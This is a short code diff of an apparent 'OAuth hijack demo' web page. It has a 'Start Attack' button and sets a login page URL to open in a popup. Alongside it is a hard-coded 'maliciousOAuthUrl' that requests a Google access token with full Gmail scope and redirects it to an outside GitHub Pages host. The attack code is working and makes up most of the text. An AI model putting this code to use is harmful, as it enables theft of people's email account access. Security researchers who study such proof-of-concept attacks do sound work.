@@ -8,7 +8,7 @@
   <button onclick="launch()">Start Attack</button>
 
   <script>
-    const loginTarget = ""
+    const loginTarget = "https://auth.openai.com/log-in" //** Replace with your login url
     const maliciousOAuthUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
     function launch() {
       const win = window.open(loginTarget, "_blank", "width=900,height=700");
